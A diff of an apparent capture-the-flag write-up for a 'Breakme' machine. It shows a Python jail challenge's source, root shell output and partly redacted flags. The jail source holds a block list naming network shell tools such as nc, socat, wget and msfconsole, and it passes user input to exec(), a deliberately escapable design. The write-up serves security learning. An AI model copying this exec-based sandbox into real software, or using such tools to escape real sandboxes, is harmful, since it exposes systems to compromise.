'lwp-', 'lwp-request', 'mail', 'make', 'man', 'mawk', 'more', 'mosquitto', 'mount', 'msfconsole', 'msgattrib', 'msgcat', 'msgconv', 'msgfilter', 'msgmerge', 'msguniq', 'mtr', 'multitime', 'mv', 'mysql', 'nano', 'nasm', 'nawk', 'nc', 'ncftp', 'neofetch', 'nft', 'nice', 'nl', 'nm', 'nmap', 'node', 'nohup', 'npm', 'nroff', 'nsenter', 'octave', 'od', 'openssl', 'openvpn', 'openvt', 'opkg', 'pandoc', 'paste', 'pax', 'pdb', 'pdflatex', 'pdftex', 'perf', 'perl', 'perlbug', 'pexec', 'pg', 'php', 'pic', 'pico', 'pidstat', 'pip', 'pkexec', 'pkg', 'posh','pry', 'psftp', 'psql', 'ptx', 'puppet', 'pwsh', 'python', 'rake', 'rc', 'readelf', 'red', 'redcarpet', 'redis', 'restic', 'rev', 'rlogin', 'rlwrap', 'rpm', 'rpmdb', 'rpmquery', 'rpmverify', 'rsync', 'rtorrent', 'ruby', 'run-mailcap', 'run-parts', 'rview', 'rvim', 'sash', 'scanmem', 'scp', 'screen', 'script', 'scrot', 'sed', 'service', 'setarch', 'setfacl', 'setlock', 'sftp', 'sg', 'shuf', 'slsh', 'smbclient', 'snap', 'socat', 'socket', 'soelim', 'softlimit', 'sort', 'split', 'sqlite3', 'sqlmap', 'ss', 'ssh-agent', 'ssh-keygen', 'ssh-keyscan', 'ssh', 'sshpass', 'start-stop-daemon', 'stdbuf', 'strace', 'strings', 'su', 'sysctl', 'systemctl', 'systemd-resolve', 'tac', 'tail', 'tar', 'task', 'taskset', 'tasksh', 'tbl', 'tclsh', 'tcpdump', 'tdbtool', 'tee', 'telnet', 'tex', 'tftp', 'tic', 'time', 'timedatectl', 'timeout', 'tmate', 'tmux', 'top', 'torify', 'torsocks', 'troff', 'tshark', 'ul', 'unexpand', 'uniq', 'unshare', 'unzip', 'update-alternatives', 'uudecode', 'uuencode', 'vagrant', 'valgrind', 'vi', 'view', 'vigr', 'vim', 'vimdiff', 'vipw', 'virsh', 'volatility', 'w3m', 'wall', 'watch', 'wc', 'wget', 'whiptail', 'whois', 'wireshark', 'wish', 'xargs', 'xdotool', 'xelatex', 'xetex', 'xmodmap', 'xmore', 'xpad', 'xxd', 'xz', 'yarn', 'yash', 'yelp', 'yum', 'zathura', 'zip', 'zsh', 'zsoelim', 'zypper','&','|','$','{','>','<']:
+                    if keyword in text:
+                        malicious()
+                        return
+                try:
+                    if "__builtins__.__dict__['__IMPORT__'.casefold()]('OS'.casefold()).__dict__['SYSTEM'.casefold()]('" in text:
+                        if len(text)!=119 or os.path.islink(text[95:-2]):
+                            malicious()
+                            return
+                        else:
+                            if(text[95:-2]!="/lib/yorick/bin/yorick"):
+                                malicious()
+                                return
+                            else:
+                                exec(text)
+                    else:
+                        exec(text)
+                except SyntaxError:
+                    print("Wrong Input")
+                except NameError:
+                    print("Wrong Input")
+
+if __name__ == "__main__":
+        print("  Welcome to Python jail  ")
+        print("  Will you stay locked forever  ")
+        print("  Or will you BreakMe  ")
+        main()
+```
  
 
-## Reconnaissance
-### Front-End Recon
-### Web Application Enumeration
-### Fingerprinting Web Servers
-### Inspecting HTTP Response Headers and Sitemaps
+```bash
+root@Breakme:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+```bash
+root@Breakme:~# ls -al
+total 52
+drwx------  3 root root 4096 Mar 21  2024 .
+drwxr-xr-x 18 root root 4096 Aug 17  2021 ..
+lrwxrwxrwx  1 root root    9 Aug  3  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+-rwx------  1 root root 5438 Jul 31  2023 index.php
+-rw-r--r--  1 root root 5000 Mar 21  2024 jail.py
+-rw-r--r--  1 root root    0 Mar 21  2024 .jail.py.swp
+-rw-------  1 root root   33 Aug  3  2023 .lesshst
+drwxr-xr-x  3 root root 4096 Aug 17  2021 .local
+-rw-------  1 root root 7575 Feb  4  2024 .mysql_history
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-------  1 root root   33 Aug  3  2023 .root.txt
+root@Breakme:~# 
+```
+ 
+ ### Flags 
+- flag 1
+    - 5c3ea0d31[redacted]13785b26677
+- flag 2
+	- df5b1b7f2[redacted]7673b22633c
 
-## Mapping and Discovery
-### Adding Localhost
-### Debugging Page Content
-### Technology Stack Identification
-### Directory and File Listings
+- root flag
+	- e257d5848[redacted]9fb9fd47d8
 
-## Vulnerability Analysis
-### Security Testing
-### Enumerating APIs
-### Vulnerability Identification
-
-## Exploitation
-### Post Exploitation Enumeration 
-### Lateral Movement 
-### Gaining Root 
-
-## Post-Exploitation
-### Flags
-### Covering Tracks 
-
-## Reporting
-### Summary
+![sucess](success.png)
